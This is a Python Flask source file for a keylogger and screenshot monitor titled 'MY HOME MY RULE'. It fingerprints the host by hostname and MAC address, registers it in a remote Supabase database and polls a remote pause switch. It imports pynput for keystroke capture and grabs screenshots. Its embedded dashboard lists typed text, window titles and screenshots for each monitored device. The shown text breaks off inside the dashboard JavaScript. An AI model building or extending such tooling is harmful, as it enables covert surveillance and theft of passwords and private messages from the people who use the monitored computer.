import os
import re
import time
import socket
import ctypes
import threading

# Set process DPI awareness to resolve blank/black screenshots on scaled displays
try:
    ctypes.windll.user32.SetProcessDPIAware()
except Exception:
    pass
import uuid
from datetime import datetime, timezone

# Try imports for headless server compatibility (Render)
try:
    import pynput
except ImportError:
    pynput = None

try:
    from PIL import Image, ImageGrab
except ImportError:
    Image = None
    ImageGrab = None

try:
    import mss
except ImportError:
    mss = None

from flask import Flask, jsonify, send_from_directory, render_template_string, request
from dotenv import load_dotenv
from supabase import create_client, Client

# Change working directory to the directory of this script to avoid writing to C:\Windows\system32
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except Exception:
    pass

# Load environment variables
load_dotenv()

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
SUPABASE_BUCKET = os.getenv("SUPABASE_BUCKET", "screenshots")

# Initialize Supabase client
supabase = None
if SUPABASE_URL and SUPABASE_KEY:
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    except Exception as e:
        print(f"Error initializing Supabase client: {e}")

# Unique device identification helper
def get_device_id():
    try:
        mac = uuid.getnode()
        mac_hex = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        hostname = socket.gethostname()
        return f"{hostname}_{mac_hex}"
    except Exception:
        return socket.gethostname() or "unknown_device"

def register_device():
    if supabase is None:
        return
    device_id = get_device_id()
    hostname = socket.gethostname() or "Unknown Device"
    try:
        supabase.table("devices").upsert({
            "device_id": device_id,
            "nickname": hostname,
            "last_active": datetime.now(timezone.utc).isoformat()
        }).execute()
        print(f"Device successfully registered/updated: {device_id} ({hostname})")
    except Exception as e:
        print(f"Failed to register/upsert device in Supabase: {e}")

is_monitoring_disabled = False

def check_disabled_status_loop():
    global is_monitoring_disabled
    if supabase is None:
        return
    device_id = get_device_id()
    while True:
        try:
            res = supabase.table("devices").select("is_disabled").eq("device_id", device_id).execute()
            if res.data:
                is_monitoring_disabled = res.data[0].get("is_disabled", False)
        except Exception as e:
            print(f"Failed to check remote disabled status: {e}")
        time.sleep(30)

# Register local device on client startup (only if not running in SERVER_ONLY mode)
server_only = os.getenv('SERVER_ONLY', 'false').lower() == 'true' or pynput is None
if not server_only:
    register_device()
    threading.Thread(target=check_disabled_status_loop, daemon=True).start()

# Initialize logs and screenshots directories (kept for fallback / temp storage)
os.makedirs("logs", exist_ok=True)
os.makedirs("screenshots", exist_ok=True)

# Initialize global activity timers
last_activity_time = datetime.now()
last_screenshot_time = datetime.now()

# Initialize Flask App
app = Flask(__name__)

# Thumbnail-based duplicate screenshot detection to save space
last_screenshot_thumbnail = None

def is_screenshot_redundant(current_img):
    global last_screenshot_thumbnail
    try:
        # Resize to a tiny 16x16 grayscale thumbnail
        thumb = current_img.resize((16, 16)).convert("L")
        if last_screenshot_thumbnail is None:
            last_screenshot_thumbnail = thumb
            return False
        
        # Calculate sum of absolute pixel differences
        p1 = list(thumb.getdata())
        p2 = list(last_screenshot_thumbnail.getdata())
        diff = sum(abs(p1[i] - p2[i]) for i in range(len(p1)))
        normalized_diff = diff / len(p1)
        
        # If average difference per pixel is < 5.0 gray levels, they are virtually identical
        if normalized_diff < 5.0:
            return True
            
        last_screenshot_thumbnail = thumb
        return False
    except Exception:
        return False

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Keystroke Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-main: #0f172a;
            --bg-card: #1e293b;
            --bg-hover: #334155;
            --border: #334155;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --live: #10b981;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            padding: 2rem;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            border-bottom: 1px solid var(--border);
            padding-bottom: 1.5rem;
        }
        
        h1 {
            font-size: 1.75rem;
            font-weight: 700;
            background: linear-gradient(to right, #818cf8, #c084fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .live-status {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background-color: rgba(16, 185, 129, 0.1);
            color: var(--live);
            padding: 0.5rem 1rem;
            border-radius: 9999px;
            font-size: 0.875rem;
            font-weight: 500;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }
        
        .live-dot {
            width: 8px;
            height: 8px;
            background-color: var(--live);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
        
        .date-selector-wrapper {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            padding: 0.5rem 1rem;
            border-radius: 8px;
        }
        
        .date-select {
            background-color: transparent;
            color: var(--text-main);
            border: none;
            outline: none;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        
        .date-select option {
            background-color: var(--bg-card);
            color: var(--text-main);
        }
        
        .tabs {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
            background-color: var(--bg-card);
            padding: 0.375rem;
            border-radius: 8px;
            width: fit-content;
            border: 1px solid var(--border);
        }
        
        .tab-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            padding: 0.5rem 1.5rem;
            font-size: 0.95rem;
            font-weight: 500;
            cursor: pointer;
            border-radius: 6px;
            transition: all 0.2s ease;
        }
        
        .tab-btn:hover {
            color: var(--text-main);
        }
        
        .tab-btn.active {
            background-color: var(--accent);
            color: var(--text-main);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Action / Selection Bar */
        .action-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            padding: 0.75rem 1.25rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
        }
        
        .select-all-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
            cursor: pointer;
            user-select: none;
        }
        
        .bulk-delete-btn {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            font-size: 0.875rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .bulk-delete-btn:hover:not(:disabled) {
            background-color: #dc2626;
        }
        
        .bulk-delete-btn:disabled {
            background-color: var(--border);
            color: var(--text-muted);
            cursor: not-allowed;
            opacity: 0.5;
        }
        
        /* Card Checkboxes */
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-right: 0.5rem;
        }
        
        .card-checkbox {
            width: 16px;
            height: 16px;
            border-radius: 4px;
            border: 2px solid var(--border);
            accent-color: var(--accent);
            cursor: pointer;
        }
        
        /* Logs Styling */
        .logs-container {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .log-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1.25rem;
            transition: transform 0.2s ease, border-color 0.2s ease;
        }
        
        .log-card:hover {
            border-color: var(--accent);
            transform: translateY(-2px);
        }
        
        .log-meta {
            display: flex;
            flex-wrap: wrap;
            gap: 0.75rem;
            align-items: center;
            margin-bottom: 0.75rem;
            font-size: 0.8rem;
        }
        
        .log-time {
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
        }
        
        .log-window {
            background-color: rgba(99, 102, 241, 0.15);
            color: #a5b4fc;
            padding: 0.25rem 0.625rem;
            border-radius: 4px;
            font-weight: 500;
            border: 1px solid rgba(99, 102, 241, 0.3);
            max-width: 400px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .log-text {
            font-size: 1.05rem;
            font-weight: 500;
            line-height: 1.5;
            word-break: break-all;
        }
        
        .log-screenshot-link {
            display: inline-flex;
            align-items: center;
            gap: 0.375rem;
            font-size: 0.8rem;
            color: var(--accent);
            text-decoration: none;
            margin-top: 0.75rem;
            font-weight: 500;
            cursor: pointer;
        }
        
        .log-screenshot-link:hover {
            color: var(--accent-hover);
            text-decoration: underline;
        }
        
        .delete-btn {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 0.35rem 0.75rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 0.75rem;
            transition: background-color 0.2s;
            width: 100%;
            display: block;
            text-align: center;
        }
        
        .delete-btn:hover {
            background-color: #dc2626;
        }
        
        .delete-icon-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 0.8rem;
            cursor: pointer;
            margin-left: auto;
            transition: color 0.2s;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
        }
        
        .delete-icon-btn:hover {
            color: #ef4444;
            background-color: rgba(239, 68, 68, 0.1);
        }
        
        /* Screenshots Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 1.5rem;
        }
        
        .screenshot-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
            transition: transform 0.2s ease, border-color 0.2s ease;
            cursor: pointer;
            position: relative;
        }
        
        .screenshot-card:hover {
            border-color: var(--accent);
            transform: translateY(-4px);
        }
        
        .screenshot-checkbox-wrapper {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 10;
            background-color: rgba(15, 23, 42, 0.8);
            padding: 4px;
            border-radius: 4px;
            border: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .img-container {
            width: 100%;
            height: 160px;
            background-color: #0b0f19;
            overflow: hidden;
            position: relative;
            border-bottom: 1px solid var(--border);
        }
        
        .img-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.3s ease;
        }
        
        .screenshot-card:hover .img-container img {
            transform: scale(1.05);
        }
        
        .screenshot-info {
            padding: 1rem;
        }
        
        .screenshot-window {
            font-size: 0.85rem;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 0.5rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            padding-left: 0.25rem;
        }
        
        .screenshot-time {
            font-size: 0.75rem;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
            padding-left: 0.25rem;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(15, 23, 42, 0.95);
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }
        
        .modal-content {
            max-width: 90%;
            max-height: 85%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            border: 1px solid var(--border);
            object-fit: contain;
        }
        
        .modal-close {
            position: absolute;
            top: 1.5rem;
            right: 2rem;
            color: var(--text-main);
            font-size: 2.5rem;
            cursor: pointer;
            user-select: none;
            transition: color 0.2s;
        }
        
        .modal-close:hover {
            color: var(--accent);
        }
        
        .modal-delete-btn {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 0.625rem 1.25rem;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 0.5rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
        
        .modal-delete-btn:hover {
            background-color: #dc2626;
        }
        
        .no-data {
            text-align: center;
            padding: 3rem;
            color: var(--text-muted);
            background-color: var(--bg-card);
            border-radius: 8px;
            border: 1px dashed var(--border);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div>
                <h1>MY HOME MY RULE</h1>
                <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem;">Live Keystroke & Activity Monitor - Monitoring active applications, typed text, and screenshots</p>
            </div>
            <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                <div class="date-selector-wrapper">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Select Device:</span>
                    <select id="device-select" class="date-select" onchange="changeDevice(this.value)"></select>
                    <button onclick="promptRenameDevice()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0 0.25rem;" title="Rename Device">Rename</button>
                    <button id="toggle-monitor-btn" onclick="toggleDeviceMonitoring()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0 0.25rem; margin-left: 0.25rem;" title="Pause/Resume Monitoring">Pause Logs</button>
                </div>
                <div class="date-selector-wrapper">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Start Date:</span>
                    <input type="date" id="start-date-input" class="date-select" onchange="changeDateRange()" style="border: none; color-scheme: dark; font-weight: 600;">
                </div>
                <div class="date-selector-wrapper">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">End Date:</span>
                    <input type="date" id="end-date-input" class="date-select" onchange="changeDateRange()" style="border: none; color-scheme: dark; font-weight: 600;">
                </div>
                <div class="date-selector-wrapper">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Sort:</span>
                    <select id="sort-select" class="date-select" onchange="changeSort(this.value)">
                        <option value="asc">Oldest First (Asc)</option>
                        <option value="desc">Newest First (Desc)</option>
                    </select>
                </div>
                <div class="live-status">
                    <span class="live-dot"></span>
                    LIVE CONNECTED
                </div>
            </div>
        </header>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('logs-tab', this)">Keystroke Logs</button>
            <button class="tab-btn" onclick="switchTab('screenshots-tab', this)">Screenshots</button>
        </div>
        
        <div class="filter-bar" style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1.5rem; background-color: var(--bg-card); border: 1px solid var(--border); padding: 0.75rem 1rem; border-radius: 8px; flex-wrap: wrap;">
            <div style="flex: 1; min-width: 250px; display: flex; align-items: center; gap: 0.5rem; background-color: var(--bg-main); border: 1px solid var(--border); padding: 0.4rem 0.75rem; border-radius: 6px;">
                <svg style="width:16px;height:16px;color:var(--text-muted);" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                <input type="text" id="search-input" oninput="applyFilters()" placeholder="Search logs, app window titles..." style="background:none; border:none; outline:none; color:var(--text-main); width:100%; font-size:0.9rem;">
            </div>
            <label style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--text-muted); cursor: pointer; user-select: none;">
                <input type="checkbox" id="group-checkbox" onchange="applyFilters()" style="cursor: pointer; accent-color: var(--accent); width:16px; height:16px;">
                Group by App
            </label>
        </div>
        
        <div id="logs-tab" class="tab-content active">
            <div class="action-bar" id="logs-action-bar" style="display: none;">
                <label class="select-all-container">
                    <input type="checkbox" class="card-checkbox" id="select-all-logs" onchange="toggleSelectAllLogs(this)">
                    Select All
                </label>
                <button class="bulk-delete-btn" id="bulk-delete-logs-btn" disabled onclick="bulkDeleteLogs()">
                    Delete Selected (0)
                </button>
            </div>
            <div id="logs-list" class="logs-container">
                <div class="no-data">Waiting for activity logs...</div>
            </div>
        </div>
        
        <div id="screenshots-tab" class="tab-content">
            <div class="action-bar" id="screenshots-action-bar" style="display: none;">
                <label class="select-all-container">
                    <input type="checkbox" class="card-checkbox" id="select-all-screenshots" onchange="toggleSelectAllScreenshots(this)">
                    Select All
                </label>
                <button class="bulk-delete-btn" id="bulk-delete-screenshots-btn" disabled onclick="bulkDeleteScreenshots()">
                    Delete Selected (0)
                </button>
            </div>
            <div id="screenshots-grid" class="grid">
                <div class="no-data" style="grid-column: 1 / -1;">Waiting for screenshots...</div>
            </div>
        </div>
    </div>
    
    <div id="imgModal" class="modal" onclick="closeModal()">
        <span class="modal-close" onclick="event.stopPropagation(); closeModal();">&times;</span>
        <div style="position: relative; display: flex; flex-direction: column; align-items: center; gap: 1rem; max-width: 90%; max-height: 90vh;" onclick="event.stopPropagation();">
            <img class="modal-content" id="modalImg" style="max-width: 100%; max-height: 75vh;">
            <button id="modal-delete-btn" class="modal-delete-btn" onclick="deleteModalScreenshot()">Delete Screenshot</button>
        </div>
    </div>
    
    <script>
        let currentTab = localStorage.getItem('currentTab') || 'logs-tab';
        let startDate = localStorage.getItem('startDate') || new Date().toISOString().split('T')[0];
        let endDate = localStorage.getItem('endDate') || new Date().toISOString().split('T')[0];
        let selectedSort = localStorage.getItem('selectedSort') || 'asc';
        let selectedDevice = localStorage.getItem('selectedDevice') || '';
        let allDevices = [];
        let allLogs = [];
        let allScreenshots = [];
        
        // Track selected items across updates
        let selectedLogKeys = new Set(); // format: "timestamp||text"
        let selectedScreenshotFilenames = new Set();
        
        let currentModalFilename = '';
        
        function switchTab(tabId, btn) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            
            document.getElementById(tabId).classList.add('active');
            btn.classList.add('active');
            currentTab = tabId;
            localStorage.setItem('currentTab', tabId);
        }
        
        function openImage(src, filename) {
            const modal = document.getElementById('imgModal');
            const img = document.getElementById('modalImg');
            const deleteBtn = document.getElementById('modal-delete-btn');
            
            modal.style.display = 'flex';
            img.src = src;
            
            if (filename) {
                currentModalFilename = filename;
                deleteBtn.style.display = 'block';
            } else {
                let extracted = src;
                if (src.startsWith('/screenshots/')) {
                    extracted = src.substring('/screenshots/'.length);
                } else if (src.startsWith('screenshots/')) {
                    extracted = src.substring('screenshots/'.length);
                }
                currentModalFilename = extracted;
                deleteBtn.style.display = 'block';
            }
        }
        
        function closeModal() {
            document.getElementById('imgModal').style.display = 'none';
        }
        
        async function deleteModalScreenshot() {
            if (!currentModalFilename) return;
            if (!confirm("Are you sure you want to delete this screenshot?")) {
                return;
            }
            try {
                const res = await fetch(`/api/screenshots/${currentModalFilename}`, {
                    method: 'DELETE'
                });
                if (res.ok) {
                    closeModal();
                    selectedScreenshotFilenames.delete(currentModalFilename);
                    fetchScreenshots();
                    fetchLogs();
                } else {
                    alert("Failed to delete screenshot");
                }
            } catch (err) {
                console.error("Error deleting screenshot:", err);
            }
        }
        
        function changeSort(sortOrder) {
            selectedSort = sortOrder;
            localStorage.setItem('selectedSort', sortOrder);
            fetchLogs();
            fetchScreenshots();
        }
        
        function updateMonitoringButton() {
            const dev = allDevices.find(d => d.device_id === selectedDevice);
            const btn = document.getElementById('toggle-monitor-btn');
            if (!btn) return;
            if (dev && dev.is_disabled) {
                btn.innerText = "Resume Logs";
                btn.style.color = "#ef4444"; // Red
                btn.title = "Monitoring is currently paused. Click to resume.";
            } else {
                btn.innerText = "Pause Logs";
                btn.style.color = "#3b82f6"; // Blue
                btn.title = "Monitoring is active. Click to pause.";
            }
        }

        async function toggleDeviceMonitoring() {
            if (!selectedDevice) return;
            const dev = allDevices.find(d => d.device_id === selectedDevice);
            if (!dev) return;
            const newStatus = !dev.is_disabled;
            
            const confirmMsg = newStatus 
                ? "Are you sure you want to PAUSE monitoring on this device? The laptop will stop capturing keystrokes and screenshots." 
                : "Are you sure you want to RESUME monitoring on this device?";
                
            if (!confirm(confirmMsg)) return;
            
            try {
                const res = await fetch('/api/devices/toggle-monitoring', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectedDevice, is_disabled: newStatus })
                });
                if (res.ok) {
                    await fetchDevices();
                } else {
                    alert("Failed to update monitoring status");
                }
            } catch (err) {
                console.error("Error toggling monitoring:", err);
            }
        }

        async function fetchDevices() {
            try {
                const res = await fetch('/api/devices');
                const devices = await res.json();
                allDevices = devices;
                const select = document.getElementById('device-select');
                
                const prevSelection = localStorage.getItem('selectedDevice') || select.value || selectedDevice;
                
                select.innerHTML = '';
                devices.forEach(dev => {
                    const option = document.createElement('option');
                    option.value = dev.device_id;
                    option.innerText = dev.nickname || dev.device_id;
                    select.appendChild(option);
                });
                
                if (devices.length > 0) {
                    if (devices.some(d => d.device_id === prevSelection)) {
                        selectedDevice = prevSelection;
                    } else {
                        selectedDevice = devices[0].device_id;
                    }
                    select.value = selectedDevice;
                    localStorage.setItem('selectedDevice', selectedDevice);
                }
                updateMonitoringButton();
            } catch (err) {
                console.error("Error fetching devices:", err);
            }
        }
        
        function changeDevice(deviceId) {
            selectedDevice = deviceId;
            localStorage.setItem('selectedDevice', deviceId);
            selectedLogKeys.clear();
            selectedScreenshotFilenames.clear();
            updateMonitoringButton();
            fetchLogs();
            fetchScreenshots();
        }
        
        async function promptRenameDevice() {
            if (!selectedDevice) return;
            const select = document.getElementById('device-select');
            const currentNickname = select.options[select.selectedIndex].text;
            
            const newName = prompt("Enter a new nickname for this device:", currentNickname);
            if (newName === null || newName.trim() === '') return;
            
            try {
                const res = await fetch('/api/devices/rename', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectedDevice, nickname: newName.trim() })
                });
                if (res.ok) {
                    await fetchDevices();
                } else {
                    alert("Failed to rename device");
                }
            } catch (err) {
                console.error("Error renaming device:", err);
            }
        }
        
        function changeDateRange() {
            startDate = document.getElementById('start-date-input').value;
            endDate = document.getElementById('end-date-input').value;
            localStorage.setItem('startDate', startDate);
            localStorage.setItem('endDate', endDate);
            
            selectedLogKeys.clear();
            selectedScreenshotFilenames.clear();
            fetchLogs();
            fetchScreenshots();
        }
        
        async function fetchLogs() {
            if (!startDate || !endDate) {
                document.getElementById('logs-list').innerHTML = '<div class="no-data">No logs found for this date range/device.</div>';
                document.getElementById('logs-action-bar').style.display = 'none';
                return;
            }
            try {
                const res = await fetch(`/api/logs?start_date=${startDate}&end_date=${endDate}&device_id=${selectedDevice}`);
                const data = await res.json();
                allLogs = data;
                applyFilters();
            } catch (err) {
                console.error("Error fetching logs:", err);
            }
        }
        
        async function fetchScreenshots() {
            if (!startDate || !endDate) {
                document.getElementById('screenshots-grid').innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found for this date range/device.</div>';
                document.getElementById('screenshots-action-bar').style.display = 'none';
                return;
            }
            try {
                const res = await fetch(`/api/screenshots?start_date=${startDate}&end_date=${endDate}&device_id=${selectedDevice}`);
                const data = await res.json();
                allScreenshots = data;
                applyFilters();
            } catch (err) {
                console.error("Error fetching screenshots:", err);
            }
        }
        
        function getAppName(windowTitle) {
            if (!windowTitle) return "Unknown Application";
            const parts = windowTitle.split(" - ");
            if (parts.length > 1) {
                return parts[parts.length - 1].trim();
            }
            return windowTitle;
        }
        
        function applyFilters() {
            const query = document.getElementById('search-input').value.toLowerCase().trim();
            const groupChecked = document.getElementById('group-checkbox').checked;
            
            let filteredLogs = allLogs.filter(log => {
                const textMatch = log.text && log.text.toLowerCase().includes(query);
                const windowMatch = log.window && log.window.toLowerCase().includes(query);
                const appMatch = log.window && getAppName(log.window).toLowerCase().includes(query);
                return !query || textMatch || windowMatch || appMatch;
            });
            
            let filteredScreenshots = allScreenshots.filter(img => {
                const windowMatch = img.window && img.window.toLowerCase().includes(query);
                const appMatch = img.window && getAppName(img.window).toLowerCase().includes(query);
                return !query || windowMatch || appMatch;
            });
            
            renderLogs(filteredLogs, groupChecked);
            renderScreenshots(filteredScreenshots);
        }
        
        function renderLogs(logsList, groupChecked) {
            const container = document.getElementById('logs-list');
            const actionBar = document.getElementById('logs-action-bar');
            
            if (logsList.length > 0) {
                actionBar.style.display = 'flex';
            } else {
                actionBar.style.display = 'none';
                container.innerHTML = '<div class="no-data">No activity logs found.</div>';
                return;
            }
            
            let displayData = [...logsList];
            if (selectedSort === 'desc') {
                displayData.reverse();
            }
            
            let html = '';
            
            if (groupChecked) {
                const groups = {};
                displayData.forEach(log => {
                    const app = getAppName(log.window);
                    if (!groups[app]) groups[app] = [];
                    groups[app].push(log);
                });
                
                Object.keys(groups).forEach(app => {
                    const appLogs = groups[app];
                    html += `
                        <div class="app-group" style="margin-bottom: 1.5rem; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; background-color: var(--bg-card);">
                            <div class="app-group-header" onclick="toggleGroupCollapse(this)" style="display: flex; justify-content: space-between; align-items: center; background-color: rgba(99, 102, 241, 0.08); padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; user-select: none;">
                                <span style="font-weight: 600; color: #818cf8; font-size: 0.95rem;">${escapeHtml(app)} (${appLogs.length} Entries)</span>
                                <svg style="width:14px;height:14px;transition: transform 0.2s; transform: rotate(90deg);" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
                            </div>
                            <div class="app-group-body" style="display: block;">
                    `;
                    
                    appLogs.forEach(log => {
                        html += getLogCardHtml(log);
                    });
                    
                    html += `
                            </div>
                        </div>
                    `;
                });
            } else {
                displayData.forEach(log => {
                    html += getLogCardHtml(log);
                });
            }
            
            container.innerHTML = html;
            updateLogSelection();
        }
        
        function toggleGroupCollapse(header) {
            const body = header.nextElementSibling;
            const icon = header.querySelector('svg');
            if (body.style.display === 'none') {
                body.style.display = 'block';
                icon.style.transform = 'rotate(90deg)';
            } else {
                body.style.display = 'none';
                icon.style.transform = 'rotate(0deg)';
            }
        }
        
        function getLogCardHtml(log) {
            let screenshotLink = '';
            if (log.screenshot) {
                screenshotLink = `<span class="log-screenshot-link" onclick="openImage('${log.screenshot}')">
                    <svg style="width:14px;height:14px;display:inline-block;vertical-align:text-bottom;margin-right:2px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                    View Screenshot
                </span>`;
            }
            
            const escapedText = log.text.replace(/'/g, "\\'").replace(/"/g, "&quot;");
            const key = `${log.timestamp}||${escapedText}`;
            const isChecked = selectedLogKeys.has(key) ? 'checked' : '';
            
            return `
                <div class="log-card">
                    <div class="log-meta">
                        <div class="checkbox-container">
                            <input type="checkbox" class="card-checkbox log-item-checkbox" data-timestamp="${log.timestamp}" data-text="${escapedText}" ${isChecked} onchange="updateLogSelection()">
                        </div>
                        <span class="log-time">${log.timestamp}</span>
                        <span class="log-window" title="${log.window}">${log.window}</span>
                        <button class="delete-icon-btn" onclick="deleteLog('${log.timestamp}', '${escapedText}')" title="Delete Log Entry">
                            &times; Delete
                        </button>
                    </div>
                    <div class="log-text" style="padding-left: 2rem;">${escapeHtml(log.text)}</div>
                    ${screenshotLink ? `<div style="margin-top: 0.75rem; padding-left: 2rem;">${screenshotLink}</div>` : ''}
                </div>
            `;
        }
        
        function renderScreenshots(screenshotsList) {
            const container = document.getElementById('screenshots-grid');
            const actionBar = document.getElementById('screenshots-action-bar');
            
            if (screenshotsList.length > 0) {
                actionBar.style.display = 'flex';
            } else {
                actionBar.style.display = 'none';
                container.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found.</div>';
                return;
            }
            
            let displayData = [...screenshotsList];
            if (selectedSort === 'desc') {
                displayData.reverse();
            }
            
            let html = '';
            displayData.forEach(img => {
                const isChecked = selectedScreenshotFilenames.has(img.filename) ? 'checked' : '';
                
                html += `
                    <div class="screenshot-card" onclick="openImage('${img.url}', '${img.filename}')">
                        <div class="screenshot-checkbox-wrapper" onclick="event.stopPropagation();">
                            <input type="checkbox" class="card-checkbox screenshot-item-checkbox" data-filename="${img.filename}" ${isChecked} onchange="updateScreenshotSelection()">
                        </div>
                        <div class="img-container">
                            <img src="${img.url}" loading="lazy" alt="Screenshot">
                        </div>
                        <div class="screenshot-info">
                            <div class="screenshot-window" title="${img.window}">${img.window}</div>
                            <div class="screenshot-time">${img.time}</div>
                            <button class="delete-btn" onclick="event.stopPropagation(); deleteScreenshot('${img.filename}')">
                                Delete Image
                            </button>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
            updateScreenshotSelection();
        }
        
        // Selection handlers for Logs
        function toggleSelectAllLogs(selectAllBox) {
            const checkboxes = document.querySelectorAll('.log-item-checkbox');
            checkboxes.forEach(box => {
                box.checked = selectAllBox.checked;
                const key = `${box.getAttribute('data-timestamp')}||${box.getAttribute('data-text')}`;
                if (selectAllBox.checked) {
                    selectedLogKeys.add(key);
                } else {
                    selectedLogKeys.delete(key);
                }
            });
            updateLogSelection();
        }
        
        function updateLogSelection() {
            const checkboxes = document.querySelectorAll('.log-item-checkbox');
            checkboxes.forEach(box => {
                const key = `${box.getAttribute('data-timestamp')}||${box.getAttribute('data-text')}`;
                if (box.checked) {
                    selectedLogKeys.add(key);
                } else {
                    selectedLogKeys.delete(key);
                }
            });
            
            const checkedCount = selectedLogKeys.size;
            const btn = document.getElementById('bulk-delete-logs-btn');
